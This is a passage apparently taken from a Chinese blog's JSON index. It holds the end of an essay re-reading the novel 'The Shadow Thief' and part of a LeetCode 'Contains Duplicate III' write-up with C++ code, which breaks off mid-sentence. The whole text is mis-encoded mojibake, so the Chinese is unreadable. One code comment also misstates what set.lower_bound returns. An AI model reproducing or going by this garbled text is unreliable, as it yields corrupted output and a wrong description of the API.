åœˆã€‚\nå½“å…‹è•¾å„¿æ³¨æ„åˆ°é£ç­æ—¶ï¼Œå¥¹æ­£åœ¨å¨æˆ¿æ³¡èŒ¶ï¼Œå¥¹ç®€ç›´ä¸æ•¢ç›¸ä¿¡è‡ªå·±çš„çœ¼ç›ï¼Œå“å¾—æŠŠæ‰‹ä¸Šçš„æ—©é¤æ¯æ‘”ç¢åœ¨åœ°ç –ä¸Šã€‚\nå‡ åˆ†é’Ÿè¿‡åï¼Œå¤§æ¥¼çš„é—¨æ‰“å¼€ï¼Œå…‹è•¾å„¿æœæˆ‘å†²äº†è¿‡æ¥ã€‚å¥¹ç›®ä¸è½¬ç›åœ°ç›¯ç€æˆ‘ï¼Œå¯¹ç€æˆ‘å¾®ç¬‘ï¼ŒæŠŠæ‰‹æ”¾è¿›æˆ‘çš„æ‰‹é‡Œï¼Œä¸æ˜¯ä¸ºäº†æ¡æˆ‘çš„æ‰‹ï¼Œè€Œæ˜¯è¦æŠ“ä½é£ç­çš„æ‰‹æŸ„ã€‚\nåœ¨åŸå¸‚çš„å¤©ç©ºé‡Œï¼Œå¥¹ç”¨çº¸è€é¹°ç”»å‡ºå¤§å¤§çš„Så’Œæ— æ•°ä¸ªå®Œç¾çš„8ã€‚å…‹è•¾å„¿å‘æ¥æ“…é•¿åœ¨ç©ºä¸­å†™è¯—ï¼Œå½“æˆ‘ç»ˆäºçœ‹æ‡‚å¥¹å†™çš„å¥å­æ—¶ï¼Œæˆ‘è¯»å‡ºï¼šâ€æˆ‘æƒ³ä½ ã€‚â€\nä¸€ä¸ªä¼šç”¨é£ç­å‘ä½ å†™å‡ºâ€œæˆ‘æƒ³ä½ â€çš„å¥³å­©å•Šï¼ŒçœŸè®©äººæ°¸è¿œéƒ½å¿˜ä¸äº†å¥¹ã€‚\nè¿™éƒ¨ä½œå“ä»¥çˆ±æƒ…è¿™æ¡çº¿ä½œä¸ºå…¨ä¹¦çš„ç»“å°¾ï¼Œæˆ‘åœ¨ä¸¤å¹´ä¹‹å‰åˆè¯»æ­¤ä¹¦ï¼Œé¢‡è§‰æ„çŠ¹æœªå°½ã€‚å†è¯»ä¹‹ä¸‹ï¼Œæˆ‘è®¤ä¸ºè¿™æ¡ä¸»çº¿æ˜¯æœ‰ç¼ºæ†¾çš„ã€‚ä¸ºä»€ä¹ˆè‡ªç¬¬ä¸€æ¬¡åˆ†åˆ«ä¹‹åï¼Œå››å¹´é—´å†æ²¡æœ‰æœºä¼šå›å»å‘¢ï¼Ÿå°ç”·å­©çš„å¦ˆå¦ˆæ˜¯å·¥ä½œç¹é‡çš„æŠ¤å£«ï¼Œä½†æ˜¯å¯¹äºå°ç”·å­©æ˜¯å…³çˆ±çš„ï¼Œå››å¹´æš‘æœŸå…¨ç„¶åœ°æ²¡æœ‰æœºä¼šå›åˆ°æµ·æ»©è¾¹æ˜¯ä¸åˆç†çš„ã€‚é•¿å¤§åç¬¬ä¸€æ¬¡è§åˆ°å…‹è•¾å„¿ï¼Œæ¼”å‡ºä¹‹åå¥¹èº«è¾¹çš„ç”·ä¼´æ˜¯è°å‘¢ï¼Ÿä¸¤äººæœ€ç»ˆç›¸è®¤ä¹‹åï¼Œä¸‰è€…çš„æ„Ÿæƒ…è¦å¦‚ä½•å»¶ç»­å‘¢ï¼Ÿå…‹è•¾å„¿å’Œç”·ä¼´ä¸€åŒç¦»å»æ—¶ï¼Œå¥¹çš„ç¬‘å£°å·²ç»æ²¡æœ‰äº†å¤§æç´çš„éŸ³è‰²ï¼Œè¿™æ„å‘³ç€ä»€ä¹ˆï¼Ÿæˆ‘è®¤ä¸ºï¼Œè¿™äº›ç»†èŠ‚æˆ‘æ˜¯æ²¡æœ‰è¯»é€çš„ï¼Œä½œè€…ç»™æˆ‘ä»¬ç•™ä¸‹çš„ç©ºé—´å¤ªå¤šäº†ï¼Œæ€»æ˜¯æœ‰ä¸€äº›å¾ˆç¾å¥½å’Œä¸€äº›å¾ˆä¸ç¾å¥½çš„æƒ³è±¡åœ¨æˆ‘ä»¬å¿ƒå¤´è¦ç»•ï¼Œè¿™æ ·çš„ä½“ä¼šè§ä»è§æ™ºï¼Œäºæˆ‘è€Œè¨€æ˜¯ä¸å¥½çš„ã€‚\näº²æƒ… å°†äº²æƒ…æ”¾åœ¨æœ€åï¼Œæ˜¯å› ä¸ºè¿™æ®µæ„Ÿæƒ…ç»™æˆ‘æœ€å¤§çš„è§¦åŠ¨ã€‚\nå°ç”·å­©çš„çˆ¸çˆ¸åœ¨ä»–ä¸Šå°å­¦çš„æ—¶å€™ç¦»å¼€äº†å®¶åº­ï¼Œå°ç”·å­©çš„å¦ˆå¦ˆæˆäº†å•äº²å¦ˆå¦ˆã€‚è¿™ä½å¦ˆå¦ˆçœŸæ˜¯ä¸€ä¸ªæ— æ¯”æ¸©æŸ”çš„äººï¼Œæ€»æ˜¯ç»™è‡ªå·±çš„å­©å­æœ€æ¸©é¦¨çš„ä¸€é¢ï¼Œè€Œå°†ç–²ç´¯æ·±åŸ‹èµ·æ¥ã€‚åœ¨å¦ˆå¦ˆçš„å½±å“ä¸‹ï¼Œå°ç”·å­©ä¹Ÿæˆé•¿ä¸ºä¸€ä¸ªæ¸©æŸ”çš„äººï¼Œä»–ä½¿ç”¨è‡ªå·±â€œå·å½±å­â€çš„èƒ½åŠ›å¸®åŠ©å¾ˆå¤šäººæ‘†è„±äº†æ·é”ï¼Œè¿™å’Œè¿™ä½ä¼Ÿå¤§æ¯äº²çš„ä½œç”¨æ˜¯åˆ†ä¸å¼€çš„ã€‚åŒæ—¶ï¼Œé•¿æœŸä¸å¦ˆå¦ˆç›¸ä¾ä¸ºå‘½ï¼Œå°ç”·å­©çš„æƒ…æ„Ÿä¸­å…·å¤‡å¾ˆå¤šå¥³æ€§çš„æ•æ„Ÿå’ŒçŠ¹ç–‘ï¼Œä»–æ— æ³•æŠŠæ¡è‡ªå·±å‹æƒ…å’Œçˆ±æƒ…çš„ç•Œé™ï¼Œå› æ­¤ä¼¤å®³äº†æ— è¾œçš„è‹è²ã€‚\nåœ¨å°ç”·å­©ç¦»å®¶æ±‚å­¦çš„æ—¶å€™ï¼Œè¿™ä½æ¯äº²çš„ä¿¡æ˜¯æŠ¥å–œä¸æŠ¥å¿§çš„ï¼Œæ°¸è¿œä¸è®©è‡ªå·±çš„å­©å­æ“å¿ƒï¼Œç›´åˆ°æœ€ç»ˆçš„ç¦»å»ã€‚\nå°ç”·å­©å¯¹å¦ˆå¦ˆçš„çˆ±ä»æœªå˜åŒ–è¿‡ï¼Œåœ¨æ—¶å…‰æµé€ä¸­äº§ç”Ÿçš„æ€è€ƒæ˜¯éå¸¸çœŸå®çš„ï¼š\né’å°‘å¹´æ—¶æœŸï¼Œæˆ‘ä»¬æ€»æ¢¦æƒ³ç€ç¦»å¼€çˆ¶æ¯çš„ä¸€å¤©ï¼Œè€Œæ”¹å¤©ï¼Œå´æ¢æˆçˆ¶æ¯ç¦»å¼€æˆ‘ä»¬äº†ã€‚äºæ˜¯æˆ‘ä»¬å°±åªèƒ½æ¢¦æƒ³ç€ï¼Œèƒ½å¦æœ‰ä¸€æ—¶ç‰‡åˆ»ï¼Œé‡æ–°å˜å›å¯„å±…åœ¨çˆ¶æ¯å±‹æªä¸‹çš„å­©å­ï¼Œèƒ½æŠ±æŠ±ä»–ä»¬ï¼Œä¸å®³ç¾åœ°å‘Šè¯‰ä»–ä»¬ï¼Œæˆ‘ä»¬çˆ±ä»–ä»¬ï¼Œä¸ºäº†èƒ½è®©è‡ªå·±å®‰å¿ƒè€Œç´§ç´§ä¾ååœ¨ä»–ä»¬èº«è¾¹ã€‚\nåœ¨å¦ˆå¦ˆçš„è‘¬ç¤¼ä¹‹åï¼Œè¿æ¥äº†æˆ‘æœ€ä¸ºéš¾è¿‡çš„ä¸€æ®µï¼š\næˆ‘èµ°åˆ°å¨æˆ¿ï¼Œæ‰“å¼€å†°ç®±ï¼Œçœ‹åˆ°å¥¹å‡†å¤‡å¥½çš„æ™šé¤Â·Â·Â·Â·Â·Â·\næˆ‘å‘†è‹¥æœ¨é¸¡åœ°ç«™åœ¨æ•å¼€çš„å†°ç®±å‰ï¼Œçœ¼æ³ªå¤±æ§åœ°å¥”æµè€Œä¸‹ã€‚è‘¬ç¤¼å…¨ç¨‹æˆ‘éƒ½æ²¡æœ‰å“­æ³£ï¼Œä»¿ä½›å¥¹ç¦æ­¢æˆ‘å“­ï¼Œå› ä¸ºå¥¹å¸Œæœ›æˆ‘ä¸è¦åœ¨ä¼—äººé¢å‰å¤±æ€ã€‚åªæœ‰ç¢°åˆ°æ¯«ä¸èµ·çœ¼çš„å°ç»†èŠ‚æ—¶ï¼Œæˆ‘ä»¬æ‰ä¼šçªç„¶æ„è¯†åˆ°ï¼Œæ·±çˆ±çš„äººå·²ç»ä¸åœ¨çš„äº‹å®ï¼šåºŠå¤´æ¡Œä¸Šçš„é—¹é’Ÿä»åœ¨æ»´ç­”ä½œå“ï¼Œä¸€ä¸ªæ•å¤´è½åœ¨å‡Œä¹±çš„åºŠè¾¹ï¼Œä¸€å¼ ç…§ç‰‡ç«‹åœ¨äº”æ–—æŸœä¸Šï¼Œä¸€æ”¯ç‰™åˆ·æ’åœ¨æ¼±å£æ¯ä¸­ï¼Œä¸€åªèŒ¶å£¶ç«‹åœ¨å¨æˆ¿çš„çª—å°ä¸Šï¼Œå£¶å˜´é¢å‘çª—æˆ·ä»¥ä¾¿è§‚çœ‹èŠ±å›­ï¼Œè€Œæ‘†åœ¨æ¡Œä¸Šçš„ï¼Œè¿˜æœ‰åƒå‰©çš„æ·‹äº†æ«ç³–æµ†çš„è‹¹æœå¡å¡è›‹ç³•ã€‚\nè¯»å®Œä¸Šé¢çš„å¥å­ï¼Œæˆ‘çš„å†…å¿ƒå¦‚å—çŒ›å‡»ï¼Œåœ¨çœŸå®ä¸–ç•Œä¸­æ¼‚æ³Šæ•°å¹´çš„æ€ç»ªå°½çš†æ¶Œä¸Šå¿ƒå¤´ã€‚æˆ‘ä»¬è¿˜æœ‰å¤šå°‘çš„æ—¶é—´æ¥é™ªä¼´æˆ‘ä»¬æœ€çˆ±çš„äººä»¬å‘¢ï¼Ÿäº²æƒ…ï¼Œæ— æ¯”æµ“çƒˆè€Œç»ˆå°†æ¶ˆæ•£ï¼Œå‘½è¿å·²ç»æ³¨å®šäº†å…»ä½ é•¿å¤§çš„äººå°†ç¦»ä½ è€Œå»ã€‚å¦‚è‹¥æˆ‘äº²ä¸´ä¸Šé¢å¥å­ä¸­çš„æƒ…å¢ƒï¼Œå†…å¿ƒå°†ä¼šæ˜¯ä½•ç­‰çš„æ‚²ç—›ã€‚\nâ€œæ‚²å‰§å°±æ˜¯æŠŠç¾å¥½çš„ä¸œè¥¿æ‰“ç¢ç»™äººçœ‹â€ï¼Œå†è¯»ã€Šå·å½±å­çš„äººã€‹ï¼Œå·²ä¸è§‰å¾—å®ƒæ˜¯ç¾å¥½çš„ã€æ²»æ„ˆçš„ï¼Œè€Œæ˜¯æ·±æ²‰çš„ã€å¿§ä¼¤çš„ã€‚å‹æƒ…å’Œçˆ±æƒ…çš„èµ·ä¼ä¸è¿‡æ˜¯äº²æƒ…ä¸»çº¿çš„ç‚¹ç¼€ï¼Œäº²æƒ…çš„ç¼ºæ†¾ã€è¡¥å®Œã€æ¸©é¦¨å’Œåšé‡è€Œç»ˆè‡³äºé£˜æ•£ï¼Œç»™å…¨æ–‡æŸ“ä¸Šäº†æœ€å¼ºçƒˆçš„è‰²å½©ã€‚ä¸€ä½æ¸©æŸ”äº†ä¸€è¾ˆå­ã€çˆ±äº†è‡ªå·±å­©å­ä¸€è¾ˆå­çš„æ¯äº²ï¼Œæœ€ç»ˆçš„æ„¿æœ›è¿˜æ˜¯è®©è‡ªå·±çš„å­©å­è¿½æ±‚è‡ªå·±æƒ³è¦çš„ç”Ÿæ´»ï¼Œæ´»å¾—å¥åº·è€Œå¿«ä¹ï¼Œå¦‚æ­¤æ‰äºæ–‡æœ«å¼•å‡ºäº†å¯¹ç«¥å¹´çˆ±æƒ…çš„å›æº¯ã€ä¸å…‹è•¾å„¿çš„é‡é€¢ã€‚\nåœ¨è¿™æ¡ä¸»çº¿ä¸Šï¼Œæˆ‘ç°åœ¨æ‰€èƒ½è¡¨è¾¾çš„ï¼Œå¤§æŠµåªæœ‰å¦‚æ­¤ã€‚è¿™æ¡è´¯ç©¿äº†å…¨æ–‡çš„è„‰ç»œï¼Œç”¨è¨€è¯­æè¿°èµ·æ¥æ˜¯æ— åŠ›çš„ï¼Œæ˜¯éœ€è¦äº²è‡ªå»å“å‘³çš„ã€‚\nå°ç»“ ä¸¤å¹´åŠå‰è¯»æ­¤ä¹¦ï¼Œåˆå…¥å¤§å­¦çš„æ ¡é—¨ã€‚åœ¨æ²™æ²³å¼ºåŠ²çš„ç§‹é£ä¸­æœ‰æ„Ÿäºçˆ±æƒ…çº¿çš„ç¾å¥½ï¼Œé¢‡è§‰æœ¬ä¹¦å®åœ¨æ¸©æš–äººå¿ƒã€‚ä¸¤å¹´é—´ä¸–æ®Šæ—¶å¼‚ï¼Œæƒ…éšäº‹è¿ï¼Œæ— æ„ä¸­å†ä½œç¿»é˜…ï¼Œæ„Ÿæ…¨å·²ç„¶ä¸åŒã€‚ã€Šå·å½±å­çš„äººã€‹çœŸæ˜¯ä¸€éƒ¨å¾ˆå¥½çš„ä½œå“ï¼Œå¾ˆæ„Ÿè°¢å®ƒåœ¨æˆ‘æµ®èºã€åŠŸåˆ©çš„ç”Ÿæ´»ä¸­å¸¦ç»™æˆ‘ä¸€å¤©å¤šçš„ä¸“å¿ƒé˜…è¯»çš„æ—¶å…‰ï¼Œæˆ‘çš„å½±å­è¢«å·èµ°äº†ï¼Œèå…¥äº†ä¹¦ä¸­çš„ä¸–ç•Œï¼Œå®ƒåˆå›æ¥äº†ï¼Œç•™ç»™æˆ‘è¦ç»•ä¸æ•£çš„ä¸‡åƒæ€ç»ªã€‚\næ€»ç»“æ€§çš„ç¬”è®°åªæ˜¯æˆ‘é˜…è¯»æ­¤ä¹¦æ—¶è¯¸å¤šæ€è€ƒä¸­çš„ä¸€ç‚¹ï¼Œä¹¦ä¸­æ‰€åˆ»ç”»çš„å¦‚é©¬æ ¼ã€è‹è²ç­‰äººç‰©ä»…ä»…ç®€å•åœ°æåŠï¼Œä½†å¯¹äºæ•´ä¸ªæ•…äº‹çš„ä½œç”¨æ˜¯ä¸å¯å¿½è§†çš„ã€‚æˆ‘å°†è¿™æœ¬ä¹¦çš„ç”µå­ç‰ˆæœ¬ç•™åœ¨æ­¤å¤„ï¼Œå¸Œæœ›æœ‰ç¼˜è¯»åˆ°å®ƒçš„äººèƒ½äº†è§£åˆ°è¿™ä¸ªæ•…äº‹çš„å…¨éƒ¨ã€ä»è¿™éƒ¨ä¼˜ç§€çš„ä½œå“ä¸­äº§ç”Ÿä¸€äº›æ€è€ƒã€‚å¦‚æ­¤ä¸¾ä¾µçŠ¯ç‰ˆæƒï¼Œè¯·åŠæ—¶è”ç³»æˆ‘åˆ é™¤ã€‚\nã€Šå·å½±å­çš„äººã€‹ï¼ˆmobiæ ¼å¼ï¼‰\n","date":"2021-04-27T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%86%8D%E8%AF%BB%E5%81%B7%E5%BD%B1%E5%AD%90%E7%9A%84%E4%BA%BA/","title":"å†è¯»ã€Šå·å½±å­çš„äººã€‹"},{"content":"é¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/contains-duplicate-iii/\nè¿™æ˜¯ä¸ªä¸­ç­‰é¢˜ï¼Ÿ\né¢˜ç›® ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œä¸¤ä¸ªæ•´æ•° k å’Œ t ã€‚è¯·ä½ åˆ¤æ–­æ˜¯å¦å­˜åœ¨ ä¸¤ä¸ªä¸åŒä¸‹æ ‡ i å’Œ jï¼Œä½¿å¾— abs(nums[i] - nums[j]) \u0026lt;= t ï¼ŒåŒæ—¶åˆæ»¡è¶³ abs(i - j) \u0026lt;= k ã€‚\nå¦‚æœå­˜åœ¨åˆ™è¿”å› trueï¼Œä¸å­˜åœ¨è¿”å› falseã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼š nums = [1,2,3,1], k = 3, t = 0 è¾“å‡ºï¼š true ç¤ºä¾‹2\nè¾“å…¥ï¼š nums = [1,5,9,1,5,9], k = 2, t = 3 è¾“å‡ºï¼š false æ•°æ®èŒƒå›´\n0 \u0026lt;= nums.length \u0026lt;= 2 * 104 -231 \u0026lt;= nums[i] \u0026lt;= 231 - 1 0 \u0026lt;= k \u0026lt;= 104 0 \u0026lt;= t \u0026lt;= 231 - 1 åˆ†æ æœ´ç´ æƒ³æ³•ï¼šéå†æ¯ä¸ªæ»¡è¶³æ¡ä»¶çš„ i ã€ j ï¼Œæ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„å°±é€€å‡ºã€‚\næ—¶é—´å¤æ‚åº¦ O(kn) ï¼Œç›´æ¥è¶…æ—¶ã€‚\næƒ³ä¸åˆ°æ›´ä¼˜çš„åŠæ³•äº†ï¼ŒæŸ¥çœ‹é¢˜è§£ä¹‹ååœ¨æ­¤è¿›è¡Œè®°å½•ã€‚\nMethod 1ã€æ»‘åŠ¨çª—å£ + æœ‰åºé›†åˆ é¦–å…ˆå°†é—®é¢˜è¿›è¡Œç®€åŒ–ã€‚\nå¸Œæœ›ä½¿å¾— asb(i - j) \u0026lt;= k ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¯éå†åˆ°ä¸€ä¸ªä¸‹æ ‡ i ï¼Œå°±ç›´æ¥ å‘å‰ï¼ˆå‘å·¦ï¼‰ æŸ¥çœ‹ k ä¸ªå…ƒç´ ï¼Œç›´åˆ°è§¦åŠ å·¦è¾¹ç•Œ ã€‚è¿™æ ·åšçš„æ­£ç¡®æ€§åœ¨äºï¼Œæˆ‘ä»¬èƒ½å¤Ÿè€ƒè™‘åˆ°ä¸€ä¸ªä¸‹æ ‡çš„å·¦è¾¹ k ä¸ªå…ƒç´ ï¼Œè€Œå®ƒçš„å³è¾¹ k ä¸ªå…ƒç´ åœ¨æ¥ä¸‹æ¥çš„ k è½®å¾ªç¯ä¸­å¾—ä»¥è€ƒè™‘ã€‚ å¸Œæœ›ä½¿å¾— abs(nums[i] - nums[j]) \u0026lt;= t ï¼ŒåŒ–ç®€ç»å¯¹å€¼ä¸ç­‰å¼ï¼Œç­‰ä»·äº -t \u0026lt;= nums[i] - nums[j] \u0026lt;= t ï¼Œç­‰ä»·äº nums[i] - t \u0026lt;= nums[j] \u0026lt;= nums[i] + t ã€‚è¿™ä¸ªä¸ç­‰å¼è¡¨æ˜äº†ï¼Œå¯¹äºä¸€ä¸ª nums[i] å’Œå®ƒå·¦è¾¹çš„ k ä¸ªå…ƒç´  ï¼Œæˆ‘ä»¬åªéœ€è¦è€ƒè™‘è¿™ k ä¸ªå…ƒç´ ä¸­æ˜¯å¦æœ‰ä¸€ä¸ªè½åœ¨ nums[i] - t ~ nums[i] + t è¿™ä¸ªåŒºé—´å†…ã€‚ å¯¹äºç¬¬ä¸€ç‚¹ï¼Œå¸Œæœ›ä¿å­˜è¿™å·¦è¾¹çš„ k ä¸ªå…ƒç´ ï¼Œæˆ‘ä»¬è‡ªç„¶æœ‰è®¸å¤šç§åŠæ³•ï¼Œä½†æ˜¯æ™®é€šçš„ é˜Ÿåˆ—ã€å‘é‡ ç­‰æ•°æ®ç»“æ„ä¼šä½¿å¾—ç¬¬äºŒç‚¹çš„æ¡ä»¶éš¾ä»¥å®ç° â€”â€” æˆ‘ä»¬å¦‚ä½•åœ¨è¿™ k ä¸ªå…ƒç´ ä¸­æŸ¥æ‰¾è½åœ¨ nums[i] - t ~ nums[i] + t åŒºé—´å†…çš„å…ƒç´ å‘¢ï¼Ÿ\næ˜¾ç„¶ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯ä¸€ç§å¿«é€Ÿ æŸ¥æ‰¾ çš„æ•°æ®ç»“æ„ï¼Œè€Œä¸”å¯¹äºéå†åˆ°çš„ä¸€ä¸ª nums[i] æ¥è¯´ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°†å…¶æ’å…¥è¿™ä¸ªç»“æ„ä¸­ï¼Œå› æ­¤è¿™ä¸ªæ•°æ®ç»“æ„è¿˜éœ€è¦å®ç°å¿«é€Ÿçš„ æ’å…¥ ï¼Œæˆ‘ä»¬å¸Œæœ›æ»¡è¶³ç¬¬äºŒç‚¹è¦æ±‚ï¼Œæ˜¾ç„¶å°±éœ€è¦è¿™ä¸ªæ•°æ®ç»“æ„æ˜¯ æœ‰åºçš„ ï¼Œè¿™æ ·æŸ¥æ‰¾ä¸€ä¸ªç‰¹å®šèŒƒå›´å†…çš„æ•°æ®æ‰ä¼šæ˜¾å¾—æ–¹ä¾¿ã€‚\nå¥½äº†ï¼Œè¿™æ ·çš„æ•°æ®ç»“æ„å°±æ˜¯ çº¢é»‘æ ‘ ã€‚\nå¾ˆä¸å¹¸åœ°ï¼Œæˆ‘è‡³ä»Šä¸ä¼šæ‰‹å†™çº¢é»‘æ ‘çš„å®ç°ï¼›å¾ˆå¹¸è¿åœ°ï¼Œæˆ‘ä»¬ä½¿ç”¨STLæä¾›çš„ç±»å‹å°±è¡Œäº†ã€‚\næˆ‘æ­¤å‰å†™è¿‡çš„æŸç¯‡æ–‡ç« ä¹ŸæåŠäº†ï¼ŒC++ä¸­ set / map / multiset / multimap åº•å±‚éƒ½æ˜¯çº¢é»‘æ ‘ï¼›å…·ä½“åˆ°æœ¬é¢˜ï¼Œä½¿ç”¨ set å³å¯ï¼Œå› ä¸ºåœ¨ä¸€æ®µåŒºé—´å†…å‡ºç°ä¸¤ä¸ªç›¸åŒå…ƒç´ çš„è¯ï¼Œä¸€å®šæ˜¯æ»¡è¶³æ¡ä»¶çš„ã€‚\næˆ‘ä»¬å¸Œæœ›æŸ¥æ‰¾æŸä¸ªåŒºé—´çš„å…ƒç´ ï¼Œå¯ä»¥è¿›ä¸€æ­¥è½¬åŒ–ä¸º ä¸€æ¬¡æŸ¥æ‰¾ + ä¸€æ¬¡åˆ¤æ–­ï¼šå¯¹äºä¸€ä¸ª nums[i] ï¼Œæˆ‘ä»¬æ‰¾åˆ° k ä¸ªå…ƒç´ ä¸­ ç¬¬ä¸€ä¸ªå¤§äº nums[i] - t çš„å…ƒç´ ï¼Œåˆ¤æ–­å…¶æ˜¯å¦ å°äº nums[i] + t ï¼Œè‹¥æ»¡è¶³ï¼Œè¿”å› true ï¼Œè‹¥ä¸æ»¡è¶³ï¼Œåˆ™è¿™äº›å…ƒç´ ä¸­ä¹Ÿæ²¡æœ‰å…¶ä»–çš„æ»¡è¶³è€…ã€‚\nè®°ä½ï¼Œæ˜¯ ç¬¬ä¸€ä¸ªå¤§äº nums[i] - t çš„å…ƒç´ ï¼\néå¸¸ä¸é”™åœ°ï¼Œset.lower_bound() å¹²çš„å°±æ˜¯è¿™ä»½å·¥ä½œã€‚\nACä»£ç 1 class Solution { public: bool containsNearbyAlmostDuplicate(vector\u0026lt;int\u0026gt;\u0026amp; nums, int k, int t) { set\u0026lt;long\u0026gt; s; // set.lower_bound(val) // è¿”å›é›†åˆä¸­ç¬¬ä¸€ä¸ª å¤§äº valçš„å…ƒç´  for (int i = 0; i \u0026lt; nums.size(); i++) { auto lb = s.lower_bound((long)nums[i] - t); // cout \u0026lt;\u0026lt; *lb \u0026lt;\u0026lt; endl;cout \u0026lt;\u0026lt; \u0026#34;I: \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; endl; if (lb != s.end() \u0026amp;\u0026amp; *lb \u0026lt;= (long)nums[i] + t) { /* cout \u0026lt;\u0026lt; \u0026#34;I: \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; nums[i] \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; t \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; *lb \u0026lt;\u0026lt; \u0026#34; \u0026lt;= \u0026#34; \u0026lt;\u0026lt; (long)nums[i] - t \u0026lt;\u0026lt; endl; */ return true; } s.insert((long)nums[i]); if (i - k \u0026gt;= 0) { s.erase(nums[i - k]); } } return false; } }; åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š\næ•°æ®ç±»å‹ï¼ è¿™ä¸ªé¢˜çœŸæ˜¯å‘çš„ä¸èƒ½å†å‘äº†ï¼Œæ—¢ç„¶æ•°æ®èŒƒå›´é‚£ä¹ˆå¤§çš„è¯ï¼Œç»™å‡ºçš„è¾“å…¥æ•°ç»„å°±ä¸è¦ç”¨ int å˜›ï¼ˆæ‰‹åŠ¨æ“¦æ±—ï¼‰ã€‚æˆ‘ä»¬çš„é›†åˆç±»å‹æ˜¯ long ï¼Œæ¯æ¬¡åŠ å‡æ³•ä¹‹å‰ä¹Ÿéƒ½è¦å°†æ•°æ®è½¬ä¸º long ã€‚ åˆ é™¤èŒƒå›´å¤–çš„æ•°æ®ã€‚æˆ‘ä»¬æ¯ä¸€è½®å¾ªç¯çš„æ—¶å€™æ˜¯ å…ˆåˆ¤æ–­ï¼Œå†æ’å…¥ï¼Œå†åˆ é™¤ ï¼Œå› æ­¤æ³¨æ„è¾¹ç•Œæ¡ä»¶æ˜¯ i - k \u0026gt;= 0 ã€‚ Performance1 Method 2ã€æ¡¶æ’åº åŸºæœ¬ä¸Šæ‰€æœ‰çš„é¢˜è§£éƒ½è¯´æ˜¯æ¡¶æ’åºï¼Œé‚£æˆ‘ä¹Ÿå°±è·Ÿç€è¯´æ˜¯æ¡¶æ’åºå§ï¼Œå®ƒçš„å®é™…åšæ³•ä¸æˆ‘å¯¹æ¡¶æ’çš„è®¤çŸ¥è¿˜æ˜¯æœ‰ä¸€å®šçš„åŒºåˆ«çš„ã€‚\næˆ‘ä»¬çŸ¥é“ï¼Œåœ¨è®¡ç®—æœºä¸­ä¸¤ä¸ªæ•´å‹ç›¸é™¤ï¼Œç»“æœè¿˜æ˜¯æ•´å‹ï¼Œé»˜è®¤ å‘ä¸‹å–æ•´ ï¼Œå¦‚ 1 / 4 = 0 ï¼Œ 3 / 4 = 0 ï¼Œ 4 / 4 = 1 ã€‚\næŒ‰ç…§è¿™æ ·çš„é€»è¾‘ï¼Œå¯¹äºä»»æ„çš„ä¸¤ä¸ª æ•´æ•° n1 ã€ n2 ï¼Œè‹¥å®ƒä»¬é™¤ä»¥ä¸€ä¸ªæ•° t çš„ç»“æœç›¸ç­‰ï¼Œåˆ™ abs(n1 - n2) \u0026lt;= t - 1 ã€‚\næˆ‘ä»¬ä½¿ç”¨åè¯æ³•æ¥è¿›è¡Œè¯æ˜ï¼š\nå·²çŸ¥ n1 Ã· t == n2 Ã· t ï¼Œä¸å¦¨ä»¤ n1 \u0026gt; n2 ï¼Œ\nè®¾ abs(n1 - n2) \u0026gt; t - 1 ï¼Œåˆ™ n1 \u0026gt; n2 + t - 1 ï¼Œå³ n1 \u0026gt;= n2 + t ï¼ˆå®ƒä»¬éƒ½æ˜¯æ•´æ•°ï¼‰ï¼›\nåˆ™ n1 Ã· t \u0026gt;= n2 Ã· t + 1 ï¼Œ\nä¸å·²çŸ¥æ¡ä»¶è¿èƒŒï¼Œæ•…å½“ n1 Ã· t == n2 Ã· t æ—¶ï¼Œ abs(n1 - n2) \u0026lt;= t - 1 ã€‚\nå°†è¿™ä¸ªå®šç†ç»“åˆé¢˜ç›®è¿›è¡Œåˆ†æï¼Œæˆ‘ä»¬å¸Œæœ›ä½¿å¾— abs(nums[i] - nums[j]) \u0026lt;= t ï¼Œè‹¥æ˜¯ nums[i] / (t + 1) == nums[j] / (t + 1) ï¼Œåˆ™å®ƒä»¬ä¸€å®šæ»¡è¶³æ¡ä»¶ã€‚\nè¿›è¡Œäº†ç†è®ºä¸Šçš„è¯æ˜ï¼Œæˆ‘ä»¬å¯ä»¥å†æ¥çœ‹çœ‹ç›´è§‚çš„æ¨¡æ‹Ÿï¼Œè®¾ t = 3 ï¼Œæˆ‘ä»¬å¸Œæœ›æ‰¾åˆ°è·ç¦» ä¸å¤§äº3 çš„ä¸€å¯¹æ•°ï¼Œæ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬åº”è¯¥è®¡ç®— nums[i] / (3 + 1) çš„å€¼ã€‚\nä¸€äº›æ­£æ•°é™¤ä»¥4çš„å€¼ æˆ‘ä»¬å°†ä¸‹é¢çš„ç»¿è‰²æ¡†æ¡†ç§°ä¸º æ¡¶ ï¼Œä¸Šé¢çš„æ•°å­—æ ¹æ®è‡ªå·±é™¤ä»¥ 4 çš„å€¼æ¥å†³å®šè‡ªå·±åº”è¯¥åœ¨å“ªä¸€ä¸ªæ¡¶é‡Œã€‚éå¸¸å®¹æ˜“å‘ç°ï¼ŒåŒä¸€ä¸ªæ¡¶ä¸­çš„æ•°å­—æ»¡è¶³ å·®çš„ç»å¯¹å€¼ä¸å¤§äº3 è¿™ä¸€è¦æ±‚ã€‚\né™¤äº†åŒä¸€ä¸ªæ¡¶ä¸­çš„æ•°å­—ï¼Œæ˜¾ç„¶ç›¸é‚»æ¡¶ä¸­çš„æ•°å­—ä¹Ÿå¯èƒ½æ»¡è¶³è¦æ±‚ã€‚ä¾‹å¦‚å¯¹äº 1 å·æ¡¶ä¸­çš„æ•°å­— 5 æ¥è¯´ï¼Œéš”å£ 0 å·æ¡¶ä¸­çš„ 3 æˆ–è€…éš”å£ 2 